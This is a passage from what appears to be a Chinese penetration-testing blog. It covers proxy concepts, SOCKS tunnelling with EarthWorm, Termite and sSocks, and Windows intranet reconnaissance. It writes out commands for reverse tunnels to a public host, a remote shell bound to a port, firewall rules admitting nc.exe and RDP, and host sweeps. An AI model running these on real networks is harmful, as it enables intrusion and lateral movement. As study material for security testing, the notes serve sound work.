--verbose       Verbose output[INFO|DEBUG]                             <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220304133010463.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220304140512685.png"></p><p>win下可以使用代理工具proxifier</p><p>linux下用proxychains</p><p><strong>在指定代理类型时，如果指定socks4，将不能使用ping命令，后续介绍</strong></p><p>指定某些程序由127.0.0.1:1234代理，就将流量转发到内网</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220304135427676.png"></p><p>有http请求，请求中的参数为cmd,target,port</p><p>由于regeorg脚本特征非常明显，很多杀软都会对其进行查杀</p><h2 id="代理技术"><a href="#代理技术" class="headerlink" title="代理技术"></a>代理技术</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/vpn.jpeg"></p><h3 id="代理类型"><a href="#代理类型" class="headerlink" title="代理类型"></a>代理类型</h3><p>代理分为正向代理和反向代理</p><h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a><strong>正向代理</strong></h4><p>通常我们说的代理，都是指的正向代理。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-3efba166d9c57f233999dec4abb5bdfb_720w-165293759153410.jpg"></p><p>继续看这张图，你会发现，此处的代理服务器可以由客户端提供，也可以由服务器端提供。</p><p>当客户端主动使用代理服务器时，此时的代理叫正向代理。比如：一些网络代理工具（加速器/VPN…）</p><h5 id="完整流程"><a href="#完整流程" class="headerlink" title="完整流程"></a><strong>完整流程</strong></h5><p>正向代理时，由客户端发送对某一个目标服务器的请求，代理服务器在中间将请求转发给该目标服务器，目标服务器将结果返回给代理服务器，代理服务器再将结果返回给客户端。</p><p>使用正向代理时，客户端是需要配置代理服务的地址、端口、账号密码（如有）等才可使用的。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-4880f5f7d29e9669f3548ae6f00b4bdf_720w.jpg"></p><p>通过上图可以看到，客户端并没有直接与服务器相连。正向代理隐藏了真实的客户端地址。可以很好地保护客户端的安全性。</p><h5 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h5><ul><li><p><strong>访问被禁止的资源</strong>（让客户端访问原本不能访问的服务器。可能是由于路由的原因，或者策略配置的原因，客户端不能直接访问某些服务器。为了访问这些服务器，可通过代理服务器来访问）</p><ul><li><p>突破网络审查（比如谷歌、youtube…）</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-0b8beb6ccd71b1f232343a4900aa2471_720w.jpg"></p></li><li><p>再比如客户端IP被服务器封禁，可以绕过IP封禁</p></li><li><p>也可以突破网站的区域限制</p></li></ul></li><li><p><strong>隐藏客户端的地址</strong>（对于被请求的服务器而言，代理服务器代表了客户端，所以在服务器或者网络拓扑上，看不到原始客户端）</p></li><li><p><strong>进行客户访问控制</strong></p><ul><li>可以集中部署策略，控制客户端的访问行为（访问认证等）</li><li>记录用户访问记录（上网行为管理）</li><li>内部资源的控制（公司、教育网等）</li></ul></li><li><p><strong>加速访问资源</strong></p><ul><li>使用缓冲特性减少网络使用率（代理服务器设置一个较大的缓冲区，当有外界的信息通过时，同时也将其保存到缓冲区中，当其他用户再访问相同的信息时， 则直接由缓冲区中取出信息，传给用户，以提高访问速度。）</li></ul></li><li><p><strong>过滤内容</strong>（可以通过代理服务器统一过滤一些危险的指令/统一加密一些内容、防御代理服务器两端的一些攻击性行为）</p></li></ul><h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a><strong>反向代理</strong></h4><p>服务器根据客户端的请求，从其关系的一组或多组后端服务器（如Web服务器）上获取资源，然后再将这些资源返回给客户端，客户端只会得知代理服务器的IP地址，而不知道在代理服务器后面的服务器集群的存在。</p><h5 id="完整流程-1"><a href="#完整流程-1" class="headerlink" title="完整流程"></a>完整流程</h5><p>由客户端发起对代理服务器的请求，代理服务器在中间将请求转发给某一个服务器，服务器将结果返回给代理服务器，代理服务器再将结果返回给客户端。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-d70c2447834f518a04d6c34ce7574231_720w-165293785745817.jpg"></p><h5 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h5><ul><li><p><strong>负载均衡</strong></p><ul><li>如果服务器集群中有负荷较高者，反向代理通过URL重写，根据连线请求从负荷较低者获取与所需相同的资源或备援。可以有效降低服务器压力，增加服务器稳定性</li></ul></li><li><p><strong>提升服务器安全性</strong></p><ul><li><p>可以对客户端隐藏服务器的IP地址</p></li><li><p>也可以作为应用层防火墙，为网站提供对基于Web的攻击行为（例如DoS/DDoS）的防护，更容易排查恶意软件等</p></li></ul></li><li><p><strong>加密/SSL加速：</strong>将SSL加密工作交由配备了SSL硬件加速器的反向代理来完成</p></li><li><p><strong>提供缓存服务</strong>，加速客户端访问</p><ul><li>对于静态内容及短时间内有大量访问请求的动态内容提供缓存服务</li></ul></li><li><p><strong>数据统一压缩</strong></p><ul><li><p>节约带宽</p></li><li><p>为网络带宽不好的网络提供服务</p></li></ul></li><li><p><strong>统一的访问权限控制</strong></p></li><li><p><strong>统一的访问控制</strong></p></li><li><p><strong>突破互联网的封锁</strong></p><ul><li>突破谷歌访问封锁</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-c1e97a220e4b5e23ca15faf2f687f206_720w.jpg"></p><p>也就是说，不需要客户端进行代理，我们通过谷歌代理网站（该代理服务器可以访问谷歌，而我们可以访问该公开的代理服务器），也可以突破封锁。</p><ul><li><strong>为在私有网络下</strong>（如局域网）的服务器集群提供NAT穿透及外网发布服务</li><li><strong>上传下载减速控制</strong></li></ul><h3 id="代理情景"><a href="#代理情景" class="headerlink" title="代理情景"></a>代理情景</h3><p>前言道，lcx等端口转发技术</p><p>适用端口转发的网络环境有以下几种：</p><ol><li><p>   服务器处于内网，可以访问外部网络。</p></li><li><p>   服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。</p></li><li><p>   服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。</p></li></ol><p>对于以上三种情况，lcx可以突破1和2二种，但是第3种就没有办法了，因为lcx在使用中需要访问外部网络。</p><p>那么这里就要讲到<strong>socks协议(防火墙安全会话转换协议)</strong></p><p>socks代理服务可以简单地将一端的系统连接到另外一端。支持多种协议，包括http、ftp请求及其它类型的请求。</p><p>其工作于OSI第五层——会话层，介于传输层和表示层，因此不提供如<strong>传递ICMP信息</strong>之类的网络层服务</p><p>在实际渗透测试过程中，当我们成功的拿下第一台堡垒机后，此时我们又想对目标内网进一步渗透测试时，socks能够帮助我们更加快速的，方便的访问目标内网的各种资源，比传统的端口转发更加实用。</p><p>目前有两个版本：SOCKS4和SOCKS5</p><p>SOCKS4支持TELNET、FTPHTTP等TCP协议；SOCKS5支持TCP与UDP，并支持安全认证方案。</p><p>基于socks协议的转发代理工具：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/beepress-image-140684-1599633756.png"></p><p><strong>1.Earthworm</strong>   工具网址：<a href="http://rootkiter.com/EarthWorm">http://rootkiter.com/EarthWorm</a> </p><p>EW 是一套便携式的网络穿透工具，具有 SOCKS  v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内,强烈推荐使用。</p><p>目前已经有了最新版Termite，工具网址：<a href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a> </p><p><strong>2.reGeorg</strong>     工具网址：<a href="https://github.com/NoneNotNull/reGeorg">https://github.com/NoneNotNull/reGeorg</a> </p><p>reGeorg是reDuh的升级版，主要是把内网服务器的端口通过http/https隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。它利用webshell建立一个socks代理进行内网穿透，服务器必须支持aspx、php或jsp这些web程序中的一种。</p><p><strong>3.sSocks</strong>      工具网址：<a href="http://sourceforge.net/projects/ssocks/">http://sourceforge.net/projects/ssocks/</a> </p><p>sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试，其最新版为0.0.13。</p><p><strong>4.SocksCap64</strong>   工具网址：<a href="http://www.sockscap64.com/">http://www.sockscap64.com</a> (需翻墙)</p><p>SocksCap64是一款在windows下相当好使的全局代理软件。SocksCap64可以使Windows应用程序通过SOCKS代理服务器来访问网络而不需要对这些应用程序做任何修改, 即使某些本身不支持SOCKS代理的应用程序通过SocksCap64之后都可以完美的实现代理访问。</p><p><strong>5.proxychains</strong>   工具网址：<a href="http://proxychains.sourceforge.net/">http://proxychains.sourceforge.net/</a> </p><p>Proxychains是一款在LINUX下可以实现全局代理的软件，性能相当稳定可靠。在使任何程序通过代理上网，允许TCP和DNS通过代理隧道，支持HTTP、SOCKS4、SOCKS5类型的代理服务器，支持proxy chain，即可配置多个代理，同一个proxy chain可使用不同类型的代理服务器。</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="sSocks"><a href="#sSocks" class="headerlink" title="sSocks"></a>sSocks</h4><ul><li><p>sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试。官方地址：<a href="http://sourceforge.net/projects/ssocks/">sSocks (Socks5 Server) download | SourceForge.net</a></p></li><li><p>下载解压后，执行命令编译</p><blockquote><p>./configure &amp;&amp; make</p></blockquote></li><li><p>编译完成，进入src目录，会发现有nsocks、ssocksd、ssocks、rcsocks，其功能说明介绍如下：</p><ul><li>nsocks：类似通过Socks5代理后的netcat，可用来测试socks server</li><li>ssocksd：用来开启Socks5代理服务</li><li>rssocks：本地启用Socks5服务，并反弹到另一IP地址</li><li>rcsocks：接收反弹过来的Socks5服务，并转向另一端口</li></ul></li></ul><p>使用方法<strong>和nc差不多用，只不过分开了服务端和客户端</strong></p><ol><li>公网主机上执行：</li></ol><blockquote><p><strong>rc</strong>socks -l 80 -p 443 -vv</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220327132529954.png"></p><ol start="2"><li>内网主机上执行：</li></ol><blockquote><p><strong>rs</strong>socks –vv –socks 公网主机ip:443</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220327132806331.png"></p><p>启一个1000监听(浏览器访问了一下，如下)</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220327132914780.png"></p><ol start="3"><li>这时本地主机可以通过访问公网主机的80 端口访问内网主机：</li></ol><blockquote><p>curl –socks5 公网IP:80 内网:1000</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220327133336510.png"></p><h4 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h4><p><a href="https://www.anquanke.com/post/id/85494">https://www.anquanke.com/post/id/85494</a></p><p>关于 EW 的介绍</p><p>下图是一张示意图:</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220305154115425.png"></p><p>该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。</p><p>工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内</p><p>使用方法：</p><p>以下所有样例，如无特殊说明代理端口均为1080，服务均为SOCKSv5代理服务.</p><p>该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）</p><ul><li>正向SOCKS v5服务器</li></ul><p>直接公网服务器上面执行，将其作为SOCKS5服务器使用，我们就可以添加使用… //如果这个服务器在境外，那么就成功翻墙了</p><blockquote><p>./ew -s ssocksd -l 1080</p></blockquote><p>这是一个<strong>正向代理</strong>过程</p><ul><li>反弹 SOCKS v5 服务器</li></ul><p>这个操作具体分两步：</p><p>a) 先在一台具有公网 ip 的主机A上运行以下命令：</p><blockquote><p>./ew -s rcsocks -l 80 -e 443 </p></blockquote><p>b) 在无公网的跳板机B(192.168.254.128)上启动 SOCKS v5 服务并反弹到公网主机的 443端口</p><blockquote><p>./ew -s rssocks -d 1.1.1.1 -e 443 </p></blockquote><p>c) 访问无公网的目标主机c(192.168.254.130)等等</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220519140717831.png"></p><p>这是<strong>反向代理</strong></p><ul><li>多级级联</li></ul><p> 工具中自带的三条端口转发指令，它们的参数格式分别为：</p><blockquote><p>./ew -s lcx_listen -l 1080 -e 8888<br>./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999<br>./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999</p></blockquote><p> 通过这些端口转发指令可以将处于网络深层的基于TCP的服务转发至根前,比如 SOCKS v5。</p><p> 首先提供两个“二级级联”本地SOCKS测试样例：</p><p>  a) lcx_tran 的用法</p><blockquote><p>./ew -s ssocksd -l 9999<br>./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999</p></blockquote><p><strong>端口转发+正向代理</strong></p><p>如图：centos与kali在同一内网：kali具有公网ip，内网只可以连接centos，外网不可直接访问centos(往往目标不出网)</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220326220356565.png"></p><p>此时可以访问kali x.x.x.128:2333来使用centos架设的socks5代理</p><p>同样的情景：境外vps启了一个容器，防火墙策略组的存在，8000端口无法访问，也可以直接在有公网的机器架设socks5服务</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220326125535619.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220326125347604.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220326110539622.png"></p><p>这是正向代理还是反向代理呢？</p><p>正向代理？如果站在目标服务器的角度，它没有说明出网还是不出网，也没有sock5监听，只是在与目标服务器等同地位的，具有公网ip的服务器架设了socks5服务，这看起来和翻墙是等价的，即视为正向代理？</p><p>反向代理？目标服务器也没有对我们服务器连接的一个操作</p><p>这其实是非常简单的一种网络环境，应该视为反向代理，把vps视为目标边界且具有公网ip的一台服务器，该容器是和服务器在同一内网的机器，在公网机器起了一个socks5服务，并且能够通过公网访问到容器，完全就等价于内网穿透，而内网穿透本质就是反向代理</p><p>说白了就是要看目的以及目标的网络地位和服务，上面说这台机子如果是境外的，那么就实现了翻墙，但是翻墙的目标并不是这个内网机器，而是广域的被网络审查的机器</p><p>  b) lcx_listen、lcx_slave 的用法</p><blockquote><p>./ew -s lcx_listen -l 1080 -e 8888<br>./ew -s ssocksd -l 9999<br>./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220326224539.png"></p><p> 再提供一个“三级级联”的本地SOCKS测试用例以供参考</p><blockquote><p>./ew -s rcsocks -l 1080 -e 8888<br>./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999<br>./ew -s lcx_listen -l 9999 -e 7777<br>./ew -s rssocks -d 127.0.0.1 -e 7777</p></blockquote><p> 数据流向: SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</p><p>补充说明：</p><p>为了减少网络资源的消耗，程序中添加了超时机制，默认时间为10000毫秒（10秒），用户可以通过追加 -t 参数来调整这个值，单位为毫秒。在多级级联功能中，超时机制将以隧道中最短的时间为默认值。</p><p>多级级联的三种状态可以转发任意以TCP为基础的通讯服务，包括远程桌面／ssh服务 等</p><h4 id="Termite"><a href="#Termite" class="headerlink" title="Termite"></a>Termite</h4><p><a href="https://www.cnblogs.com/0nth3way/p/11690810.html">https://www.cnblogs.com/0nth3way/p/11690810.html</a></p><ol><li>以服务模式启动一个agent服务。</li></ol><blockquote><p> ./agent -l 8888</p></blockquote><ol start="2"><li>令管理端连接到agent并对agent进行管理。</li></ol><blockquote><p>./admin -c 127.0.0.1 -p 8888</p></blockquote><ol start="3"><li>此时，admin端会得到一个内置的shell, 输入help指令可以得到帮助信息。</li></ol><blockquote><p>help</p></blockquote><ol start="4"><li>通过show指令可以得到当前agent的拓扑情况。</li></ol><blockquote><p>show<br>0M<br>+– 1M</p><p>由于当前拓扑中只有一个agent，所以展示结果只有 1M ,其中1 为节点的ID号，M为MacOS系统的简写，Linux为L，Windows简写为W。</p></blockquote><ol start="5"><li>将新agent加入当前拓扑</li></ol><blockquote><p>./agent -c 127.0.0.1 -p 8888</p></blockquote><ol start="6"><li>此时show指令将得到如下效果</li></ol><blockquote><p>0M<br>+– 1M<br>|+– 2M<br>  这表明，当前拓扑中有两个节点，其中由于2节点需要通过1节点才能访问，所以下挂在1节点下方。</p></blockquote><ol start="7"><li>在2节点开启socks代理，并绑定在本地端口</li></ol><blockquote><p>goto 2<br>将当前被管理节点切换为 2 号节点。<br>socks 1080<br>此时，本地1080 端口会启动个监听服务，而服务提供者为2号节点。</p></blockquote><ol start="8"><li>在1号节点开启一个shell并绑定到本地端口</li></ol><blockquote><p>goto 1<br>shell 7777<br>此时，通过nc本地的 7777 端口，就可以得到一个 1 节点提供的 shell.</p></blockquote><ol start="9"><li>将远程的文件下载至本地</li></ol><blockquote><p>goto 1<br>downfile 1.txt 2.txt<br>将1 节点，目录下的 1.txt 下载至本地，并命名为2.txt</p></blockquote><ol start="10"><li>上传文件至远程节点</li></ol><blockquote><p>goto 2<br>upfile 2.txt 3.txt<br>将本地的 2.txt 上传至 2号节点的目录，并命名为3.txt</p></blockquote><ol start="11"><li>端口转接</li></ol><blockquote><p>goto 2<br>lcxtran 3388 10.0.0.1 3389<br>以2号节点为跳板，将 10.0.0.1 的 3389 端口映射至本地的 3388 端口</p></blockquote><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p><strong>内网穿透的本质属于反向代理</strong></p><p><a href="https://github.com/fatedier/frp">frp</a></p><p>直接利用ss翻墙容易被ban掉ip，可以frp中转</p><p><a href="https://calxu.github.io/note/20200301_vpn_2/">https://calxu.github.io/note/20200301_vpn_2/</a></p><p><a href="https://github.com/ehang-io/nps">nps</a></p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网信息收集</title>
    <link href="/2022/01/03/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2022/01/03/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="WIN"><a href="#WIN" class="headerlink" title="WIN"></a>WIN</h1><p>三问：我是谁？这是哪？我在哪？即判断当前机器，当前机器所处的网络环境(拓扑结构分析)，当前机器所处的区域</p><p>我是谁：分析当前机器的角色，web 服务器、开发测试服务器、文件服务器、代理服务器、DNS 服务器等等</p><p>这是哪：整个内网结构的分析</p><p>我在哪：DMZ、办公区、核心区；或者在其他区域</p><h2 id="收集本机信息"><a href="#收集本机信息" class="headerlink" title="收集本机信息"></a>收集本机信息</h2><h3 id="1-手动收集"><a href="#1-手动收集" class="headerlink" title="1. 手动收集"></a>1. 手动收集</h3><ul><li>网络配置</li></ul><blockquote><p><strong>ipconfig /all</strong></p></blockquote><ul><li>系统信息</li></ul><blockquote><p><strong>systeminfo</strong></p><p>提权：<a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p><p>在初步获得的 shell 回显不足时，可以配合通配符和命令 findstr</p><p>查看系统架构</p><p><strong>echo %PROCESSOR_ARCHITECTURE%</strong></p><p>这个命令判断操作系统位数是不准确的，取决于 shell 当前的 CMD 位数</p></blockquote><ul><li>查看安装软件信息</li></ul><blockquote><p><strong>wmic product get name,version</strong></p><p>在蚁剑拿到的 webshell 没有此命令的回显，可以&gt; 1.txt 后 type、more 打开</p><p><strong>powershell “Get-WmiObject -class Win32_Product|Select-Object -Property name,version“</strong></p></blockquote><ul><li>查看服务</li></ul><blockquote><p><strong>wmic service list brief</strong></p></blockquote><ul><li>查看进程</li></ul><blockquote><p><strong>tasklist</strong></p><p><strong>wmic process list brief</strong></p><p>含句柄数、进程优先级、进程 id、线程数、内存使用等</p></blockquote><ul><li>查看启动程序</li></ul><blockquote><p><strong>wmic startup get caption,command</strong></p></blockquote><ul><li>查看计划任务</li></ul><blockquote><p><strong>schtasks /query</strong></p><p>更具体的用法：schtasks /query /?</p><p>如遇报错，<strong>chcp 437</strong>即可</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211173305284.png"></p></blockquote><ul><li>查看主机统计数据</li></ul><blockquote><p><strong>net statistic workstation</strong></p></blockquote><ul><li>查询用户、组</li></ul><blockquote><p>net user</p><p><strong>query user || qwinsta</strong> 查看在线用户</p><p>net localgroup</p></blockquote><ul><li>列出或断开本地计算机与所连接的客户端之间的会话</li></ul><blockquote><p>客户端 net use \stu1.god.org hongrisec@2019 /u:administrator</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211220047347.png"></p><p>注意被连接的计算机可能需要关闭域防火墙，如果不行请排查对应服务</p><p><strong>net session</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211220109319.png"></p></blockquote><ul><li>网络连接</li></ul><blockquote><p><strong>netstat -a</strong></p></blockquote><ul><li>补丁信息</li></ul><p>在系统信息里面可以看到，也可以</p><blockquote><p><strong>wmic qfe get caption,description,hotfixid,installedon</strong></p></blockquote><ul><li>共享信息</li></ul><blockquote><p>net share</p><p>wmic share get name,path,status</p></blockquote><ul><li>查询路由表</li></ul><blockquote><p><strong>arp -a</strong></p><p><strong>route print</strong></p></blockquote><ul><li>防火墙</li></ul><blockquote><ol><li>&lt;=winServer2003 ：</li></ol><p>netsh firewall</p><p>e.g.：netsh firewall add allowedprogram c:\nc.exe “nc” enable</p><ol start="2"><li>&gt;winServer2003：</li></ol><p>netsh advfirewall</p><p>e.g.：netsh advfirewall firewall add rule name=”nc” dir=in(入站) action=allow program=”c:\nc.exe”</p><p>允许程序的具体某个端口、协议入站：</p><p>netsh advfirewall firewall add rule name=”RD” protocol=TCP dir=in localport=3389 action=allow</p></blockquote><h3 id="2-自动收集"><a href="#2-自动收集" class="headerlink" title="2. 自动收集"></a>2. 自动收集</h3><p><a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>一个基于 wmic 的 bat 脚本</p><h2 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h2><ol><li>查看当前权限</li></ol><ul><li>本地普通用户</li><li>本地管理员用户</li><li>域内用户</li></ul><blockquote><p><strong>whoami</strong></p><p>获取域 SID</p><p><strong>whoami /all</strong></p></blockquote><ol start="2"><li>查询用户(包含在域种)的详细信息</li></ol><blockquote><p><strong>net user xxx /domain</strong></p></blockquote><p>如何在域控中委派“”域账号权限“？</p><p>验证”域账号登录其他机器“</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218163656131.png" alt="image-20220218163656131"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218164732019.png" alt="image-20220218164732019"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218164932211.png" alt="image-20220218164932211"><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218164955920.png" alt="image-20220218164955920"></p><h2 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218165731711.png" alt="image-20220218165731711"></p><blockquote><p><strong>nslookup 域 DNS 后缀</strong></p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218170123641.png" alt="image-20220218170123641"></p><ul><li>查询当前登录域及登录用户信息</li></ul><blockquote><p><strong>net config workstation</strong></p></blockquote><ul><li>判断主域</li></ul><blockquote><p><strong>net time /domain</strong></p></blockquote><p>会有三种情况：</p><ol><li>存在域，但当前用户不是域用户</li></ol><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218171143257.png"></p><ol start="2"><li>不存在域，当前网络环境为工作组</li></ol><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218170622671.png" alt="image-20220218170622671"></p><ol start="3"><li>存在域，且当前用户登录到域中</li></ol><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218171230372.png" alt="image-20220218171230372"></p><blockquote><p>在域用户切换至本地用户 <strong>计算机名\本地用户</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218170819135.png" alt="image-20220218170819135"></p></blockquote><h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><h3 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h3><blockquote><p><strong>NetBIOS</strong>，为<strong>网上基本输入输出系统</strong>（英语：Network Basic Input/Output System）的缩写，它提供了<a href="https://baike.baidu.com/item/OSI%E6%A8%A1%E5%9E%8B">OSI 模型</a>中的<a href="https://baike.baidu.com/item/%E4%BC%9A%E8%AF%9D%E5%B1%82">会话层</a>服务，让在不同计算机上运行的不同<a href="https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F/13831935">程序</a>，可以在<a href="https://baike.baidu.com/item/%E5%B1%80%E5%9F%9F%E7%BD%91">局域网</a>中，互相连线，以及分享数据。严格来说，NetBIOS 不是一种网上协议，而是<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%8F%A3">应用程序接口</a>（API）。较古老的<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/192">操作系统</a>，使用[IEEE 802.2](<a href="https://baike.baidu.com/item/IEEE">https://baike.baidu.com/item/IEEE</a> 802.2)与<a href="https://baike.baidu.com/item/IPX%2FSPX">IPX/SPX</a>协议，可以使用 NetBIOS Frames 协议或 NetBIOS over <a href="https://baike.baidu.com/item/IPX%2FSPX%E5%8D%8F%E8%AE%AE/659271">IPX/SPX 协议</a>来运作。现代操作系统，多数都使用<a href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE/212915">TCP/IP 协议</a>，则可透过 NetBIOS over TCP/IP 协议来相互通信</p></blockquote><p><a href="http://www.unixwiz.net/tools/nbtscan.html">nbtscan</a></p><p>nbtscan 有 Windows 和 Linux 两个版本，使用 netbios 协议扫描本地或远程 TCP/IP 网络上的开放 NetBIOS 名称服务器。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">nbtscan.exe 192.168.7.0/24<br>192.168.7.1     \DP<br>192.168.7.7     TEAMSSIX\DC                     SHARING DC<br>192.168.7.107   TEAMSSIX\DANIEL7                SHARING<br>*timeout (normal end of scan)<br></code></pre></td></tr></table></figure><h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><blockquote><p>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I |findstr “TTL” time to live</p><p>for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep “ttl”|awk -F “[ :]+” ‘{print $4}’; done //linux</p></blockquote><h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h3><blockquote><p>for /l %a in (1,1,254) do start /min /low telnet 192.168.7.%a 445</p></blockquote><h3 id="TCPing"><a href="#TCPing" class="headerlink" title="TCPing"></a>TCPing</h3><p><a href="https://elifulkerson.com/projects/tcping.php">TCPing</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">tcping.exe -n 1 192.168.7.7 445<br><br>Probing 192.168.7.7:445/tcp - Port is open - time=1.719ms<br>Ping statistics for 192.168.7.7:445<br>     1 probes sent.<br>     1 successful, 0 failed.  (0.00% fail)<br>Approximate trip times in milli-seconds:<br>     Minimum = 1.719ms, Maximum = 1.719ms, Average = 1.719ms<br></code></pre></td></tr></table></figure><h3 id="scanline"><a href="#scanline" class="headerlink" title="scanline"></a>scanline</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">scanline.exe -n 